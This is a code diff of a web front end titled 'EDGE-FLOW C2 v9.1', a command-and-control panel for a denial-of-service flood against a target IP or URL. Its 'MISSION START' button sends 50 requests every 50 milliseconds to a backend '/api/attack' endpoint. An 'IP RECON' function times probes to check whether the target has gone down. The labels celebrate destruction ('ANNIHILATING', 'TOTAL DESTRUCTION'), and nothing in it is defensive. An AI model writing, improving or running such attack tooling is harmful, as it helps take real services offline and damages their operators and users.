@@ -3,76 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☢️ EDGE-FLOW v9.0 NEXUS</title>
+    <title>☢️ EDGE-FLOW v9.1 NEXUS</title>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
         :root { --neon: #00ff41; --bg: #030303; --panel: #0a0a0a; --border: #1a1a1a; --warn: #ff3e3e; --scan: #00d4ff; --recon: #f0f000; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg); color: var(--neon); font-family: 'SF Pro Display', -apple-system, sans-serif; margin: 0; padding: 10px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; font-size: 14px; }
-        
-        /* [UI] 멋진 헤더 */
-        .header { display: flex; justify-content: space-between; align-items: center; padding: 8px 5px; border-bottom: 2px solid var(--border); text-shadow: 0 0 10px rgba(0,255,65,0.4); margin-bottom: 10px; }
-        .header h1 { margin:0; font-size: 1.2em; font-weight: 800; letter-spacing: -1px; }
-        #statusText { padding: 2px 6px; border-radius: 4px; border: 1px solid var(--neon); font-size: 0.8em; }
-
-        /* [UI] 메인 패널 (지휘 통제소) */
-        .main-panel { display: flex; flex-direction: column; gap: 10px; flex-grow: 1; overflow-y: auto; padding-bottom: 15px; }
+        body { background: var(--bg); color: var(--neon); font-family: 'SF Pro Display', sans-serif; margin: 0; padding: 10px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 8px 5px; border-bottom: 2px solid var(--border); margin-bottom: 10px; }
+        #statusText { padding: 2px 6px; border-radius: 4px; border: 1px solid var(--neon); font-size: 0.8em; transition: 0.3s; }
+        .main-panel { display: flex; flex-direction: column; gap: 10px; flex-grow: 1; overflow-y: auto; }
         .control-block { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 12px; }
-        
-        label { display: block; margin-bottom: 4px; font-size: 0.75em; color: #888; text-transform: uppercase; font-weight: 600; }
-        input[type="text"] { background: #000; border: 1px solid var(--border); color: var(--neon); padding: 12px; width: 100%; border-radius: 6px; font-size: 1.05em; font-family: monospace; outline: none; transition: 0.2s; }
-        input[type="text"]:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(0,255,65,0.2); }
-        
-        /* [UI] 레이아웃 & 버튼 가독성 향상 */
-        .col-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
-        .btn-group { display: grid; grid-template-columns: 2fr 1fr; gap: 8px; margin-top: 5px; }
-        
-        button { border-radius: 6px; border: none; font-weight: 800; text-transform: uppercase; font-size: 1.1em; cursor: pointer; transition: 0.15s; position: relative; overflow: hidden; }
-        button:active { transform: scale(0.97); }
-        button::after { content: ''; position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(255,255,255,0.05); opacity:0; }
-        button:active::after { opacity: 1; }
-
-        /* [UI] 지휘관을 위한 화력 집중 버튼 */
-        #startBtn { background: var(--neon); color: #000; grid-column: span 2; padding: 18px 5px; box-shadow: 0 5px 20px rgba(0,255,65,0.3); margin-bottom: 8px; font-size: 1.25em;}
-        #reconBtn { background: var(--recon); color: #000; padding: 12px 5px; font-size: 1em; }
-        #stopBtn { background: #1a1a1a; color: #888; border: 1px solid #333; padding: 12px 5px; font-size: 1em; }
-
-        /* [그래프 대시보드] */
-        .dashboard { flex-grow: 1; background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 10px; display: flex; flex-direction: column; gap: 8px; }
-        
-        /* 화력 측정기 */
-        .stats-grid { display: grid; grid-template-columns: 1.5fr 1fr; gap: 8px; }
-        .stat-card { background: #111; border: 1px solid #222; border-radius: 6px; padding: 12px; text-align: center; }
-        .stat-label { font-size: 0.7em; color: #666; text-transform: uppercase; margin-bottom: 4px; }
-        .stat-value { font-size: 1.8em; font-weight: 800; letter-spacing: -1px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;}
-        
-        /* [실시간 지연 시간 그래프] */
-        .chart-container { flex-grow: 1; background: #000; border: 1px solid #222; border-radius: 6px; padding: 5px; position: relative; min-height: 180px; }
-        #latencyChart { width: 100% !important; height: 100% !important; }
-
-        /* [작전 로그] 간소화 */
-        #terminal { background: #050505; border: 1px solid #222; border-radius: 6px; padding: 8px; height: 80px; overflow-y: auto; font-family: monospace; font-size: 10px; line-height: 1.3; }
-        .log-entry { margin-bottom: 2px; border-left: 2px solid var(--neon); padding-left: 6px; }
-        .log-err { color: var(--warn); border-left-color: var(--warn); }
-        .log-recon { color: var(--recon); border-left-color: var(--recon); }
+        label { display: block; margin-bottom: 4px; font-size: 0.75em; color: #888; text-transform: uppercase; }
+        input[type="text"] { background: #000; border: 1px solid var(--border); color: var(--neon); padding: 12px; width: 100%; border-radius: 6px; font-size: 1.05em; outline: none; }
+        .btn-group { display: grid; grid-template-columns: 2fr 1fr; gap: 8px; margin-top: 10px; }
+        button { border-radius: 6px; border: none; font-weight: 800; text-transform: uppercase; cursor: pointer; transition: 0.1s; }
+        #startBtn { background: var(--neon); color: #000; width: 100%; padding: 18px; font-size: 1.2em; margin-bottom: 8px; box-shadow: 0 0 15px rgba(0,255,65,0.2); }
+        #reconBtn { background: var(--recon); color: #000; padding: 12px; }
+        #stopBtn { background: #1a1a1a; color: var(--warn); border: 1px solid var(--warn); padding: 12px; }
+        .dashboard { flex-grow: 1; background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 10px; display: flex; flex-direction: column; gap: 8px; min-height: 300px; }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+        .stat-card { background: #111; border: 1px solid #222; border-radius: 6px; padding: 10px; text-align: center; }
+        .stat-label { font-size: 0.65em; color: #666; margin-bottom: 2px; }
+        .stat-value { font-size: 1.5em; font-weight: 800; letter-spacing: -1px; }
+        .chart-container { flex-grow: 1; background: #000; border: 1px solid #222; border-radius: 6px; padding: 5px; position: relative; }
+        #terminal { background: #050505; border: 1px solid #222; border-radius: 6px; padding: 8px; height: 60px; overflow-y: auto; font-family: monospace; font-size: 10px; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>[ EDGE-FLOW C2 ]</h1>
+        <h1 style="margin:0; font-size:1.1em;">[ EDGE-FLOW C2 v9.1 ]</h1>
         <span id="statusText">STANDBY</span>
     </div>
 
     <div class="main-panel">
         <div class="control-block">
-            <label>TARGET COMMAND / URL</label>
-            <input type="text" id="target" value="http://" placeholder="http://1.2.3.4/">
+            <label>TARGET IP (http://1.2.3.4/)</label>
+            <input type="text" id="target" value="http://" placeholder="http://아이피주소/">
         </div>
 
         <div class="control-block">
             <button id="startBtn" onclick="initiate()">MISSION START</button>
             <div class="btn-group">
-                <button id="reconBtn" onclick="analyzeTarget()">CHECK</button>
+                <button id="reconBtn" onclick="analyzeTarget()">IP RECON</button>
                 <button id="stopBtn" onclick="terminate()">STOP</button>
             </div>
         </div>
@@ -80,20 +52,18 @@
         <div class="dashboard">
             <div class="stats-grid">
                 <div class="stat-card">
-                    <div class="stat-label">TOTAL PAYLOAD SENT</div>
+                    <div class="stat-label">PAYLOAD SENT</div>
                     <div class="stat-value" id="shotCount">0</div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-label">CURRENT LATENCY</div>
-                    <div class="stat-value" id="latencyDisplay" style="color:#666">--</div>
+                    <div class="stat-label">LATENCY</div>
+                    <div class="stat-value" id="latencyDisplay">--</div>
                 </div>
             </div>
-            
             <div class="chart-container">
                 <canvas id="latencyChart"></canvas>
             </div>
-            
-            <div id="terminal">>> Nexus Interface v9.0 v1.0 ONLINE. Waiting for command...</div>
+            <div id="terminal">>> Ready for IP Reconnaissance...</div>
         </div>
     </div>
 
@@ -101,121 +71,83 @@
         let attackInterval = null;
         let totalShots = 0;
         let latencyChart;
-        let chartData = { labels: [], datasets: [{ label: 'Latency (ms)', data: [], borderColor: '#00ff41', backgroundColor: 'rgba(0, 255, 65, 0.1)', borderWidth: 2, tension: 0.4, pointRadius: 2, fill: true }] };
+        let chartData = { labels: [], datasets: [{ label: 'ms', data: [], borderColor: '#00ff41', borderWidth: 2, tension: 0.3, fill: true, backgroundColor: 'rgba(0,255,65,0.05)' }] };
 
-        // [UI] 그래프 초기화
         window.onload = function() {
             const ctx = document.getElementById('latencyChart').getContext('2d');
-            Chart.defaults.color = '#555';
-            Chart.defaults.font.family = 'SF Pro Display';
-            latencyChart = new Chart(ctx, { type: 'line', data: chartData, options: { responsive: true, maintainAspectRatio: false, scales: { y: { beginAtZero: true, grid: { color: '#222' }, ticks: { color: '#666' } }, x: { grid: { color: 'transparent' }, ticks: { color: '#666' } } }, plugins: { legend: { display: false } }, animation: { duration: 200 } } });
+            latencyChart = new Chart(ctx, { type: 'line', data: chartData, options: { responsive: true, maintainAspectRatio: false, scales: { y: { beginAtZero: true, grid: { color: '#111' } }, x: { display: false } }, plugins: { legend: { display: false } } } });
         };
 
-        function log(msg, type = 'info') {
+        function log(msg, isErr = false) {
             const term = document.getElementById('terminal');
             const div = document.createElement('div');
-            div.className = `log-entry ${type === 'error' ? 'log-err' : type === 'recon' ? 'log-recon' : ''}`;
+            div.style.color = isErr ? 'var(--warn)' : 'var(--neon)';
             div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
             term.prepend(div);
-            if (term.childNodes.length > 30) term.removeChild(term.lastChild);
         }
 
-        // [최종 정찰 요격기 v8.5 호환] - 이미지 핑 방식 채택
+        // [IP 전용 정찰 엔진]
         async function analyzeTarget() {
             let target = document.getElementById('target').value.trim();
-            if (!target.startsWith('http')) { log("URL ERROR", "error"); return; }
-            if (!target.endsWith('/')) target += '/';
+            if (!target.startsWith('http')) { log("URL ERROR: http:// 필수", true); return; }
             
-            log("📡 SCANNING TARGET Vital Signs...", "recon");
-            document.getElementById('reconBtn').innerText = "SCANNING...";
-            document.getElementById('reconBtn').style.opacity = "0.7";
+            log("📡 IP RECONNAISSANCE START...");
             const start = Date.now();
             
-            const img = new Image();
-            const timeout = setTimeout(() => {
-                img.onload = img.onerror = null;
-                updateLatency(9999, '💀 격침됨'); // 타임아웃
-                log("<span class='log-recon'>💀 격침 확인!</span> 타겟 응답 없음.", "error");
-                document.getElementById('reconBtn').innerText = "CHECK";
-                document.getElementById('reconBtn').style.opacity = "1";
-            }, 7000);
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 5000);
 
-            img.onload = img.onerror = () => {
-                clearTimeout(timeout);
+                // IP 주소의 경우 80포트로 직접 찔러 보안 에러를 유도하여 시간을 측정합니다.
+                await fetch(target, { mode: 'no-cors', cache: 'no-store', signal: controller.signal });
+                
                 const ms = Date.now() - start;
-                document.getElementById('reconBtn').innerText = "CHECK";
-                document.getElementById('reconBtn').style.opacity = "1";
-                if (ms > 15) { // 15ms 미만은 가짜 응답
-                    updateLatency(ms);
-                    log(`🟢 TARGET RESPONDING (Latency: ${ms}ms)`, "recon");
+                clearTimeout(timeout);
+                updateUI(ms);
+            } catch (e) {
+                const ms = Date.now() - start;
+                // 에러가 나더라도 시간이 5초 미만이면 서버가 응답(거부)은 한 것입니다.
+                if (ms < 5000) {
+                    updateUI(ms);
+                    log(`🟢 RESPONSE DETECTED: ${ms}ms`);
+                } else {
+                    updateUI(9999, "💀 DOWN");
+                    log("💀 TARGET UNRESPONSIVE", true);
                 }
-            };
-            
-            img.src = `${target}favicon.ico?cb=${start}`;
+            }
         }
 
-        // [UI] 그래프 및 화력 측정기 업데이트
-        function updateLatency(ms, label = null) {
+        function updateUI(ms, label = null) {
             const display = document.getElementById('latencyDisplay');
-            if (label) {
-                display.innerText = label;
-                display.style.color = "#ff3e3e";
-            } else {
-                display.innerText = `${ms}ms`;
-                if (ms < 150) display.style.color = "#00ff41";
-                else if (ms < 500) display.style.color = "#f0f000";
-                else if (ms < 1500) display.style.color = "#ff9f00";
-                else display.style.color = "#ff3e3e";
-            }
+            display.innerText = label || `${ms}ms`;
+            display.style.color = ms > 1000 ? 'var(--warn)' : 'var(--neon)';
             
-            // 그래프 데이터 추가
-            const time = new Date().toLocaleTimeString();
-            chartData.labels.push(time);
-            chartData.datasets[0].data.push(ms === 9999 ? null : ms); // 격침 시 그래프 끊김
-            
-            if (chartData.labels.length > 20) {
-                chartData.labels.shift();
-                chartData.datasets[0].data.shift();
-            }
+            chartData.labels.push("");
+            chartData.datasets[0].data.push(ms === 9999 ? null : ms);
+            if (chartData.labels.length > 15) { chartData.labels.shift(); chartData.datasets[0].data.shift(); }
             latencyChart.update();
         }
 
-        async function initiate() {
+        function initiate() {
             const target = document.getElementById('target').value.trim();
-            if (!target.startsWith('http')) { log("URL ERROR", "error"); return; }
-
-            toggleButtons(true);
-            log(`🚀 TOTAL WAR DECLARED ON ${target}`);
-
-            // v9.0 NEXUS는 공격 효율을 위해 내부 스레드 고정 (GOD MODE 50x)
+            if (!target.startsWith('http')) return;
+            document.getElementById('statusText').innerText = "ANNIHILATING";
+            document.getElementById('statusText').style.color = "var(--warn)";
             attackInterval = setInterval(() => {
-                for(let i=0; i < 50; i++) {
-                    fetch(`/api/attack?target=${encodeURIComponent(target)}&cb=${Math.random()}`)
-                    .then(() => {
+                for(let i=0; i<50; i++) {
+                    fetch(`/api/attack?target=${encodeURIComponent(target)}&cb=${Math.random()}`).then(() => {
                         totalShots += 15000;
                         document.getElementById('shotCount').innerText = totalShots.toLocaleString();
-                    }).catch(() => {});
+                    }).catch(()=>{});
                 }
-            }, 50); // MAX RATE
-        }
-
-        function toggleButtons(running) {
-            document.getElementById('statusText').innerText = running ? "FIRING" : "STANDBY";
-            document.getElementById('statusText').style.color = running ? "#ff3e3e" : "#00ff41";
-            document.getElementById('statusText').style.borderColor = running ? "#ff3e3e" : "#00ff41";
-            document.getElementById('startBtn').innerText = running ? "TOTAL DESTRUCTION" : "MISSION START";
-            document.getElementById('startBtn').style.background = running ? "rgba(255,62,62,0.1)" : "#00ff41";
-            document.getElementById('startBtn').style.color = running ? "#ff3e3e" : "#000";
-            document.getElementById('startBtn').style.border = running ? "1px solid #ff3e3e" : "none";
-            document.getElementById('startBtn').disabled = running;
-            document.getElementById('stopBtn').style.border = running ? "1px solid #ff3e3e" : "1px solid #333";
-            document.getElementById('stopBtn').style.color = running ? "#ff3e3e" : "#888";
+            }, 50);
         }
 
         function terminate() {
             clearInterval(attackInterval);
-            toggleButtons(false);
-            log("🛑 CEASE FIRE.", "error");
+            document.getElementById('statusText').innerText = "STANDBY";
+            document.getElementById('statusText').style.color = "var(--neon)";
+            log("🛑 MISSION STOPPED", true);
         }
     </script>
 </body>
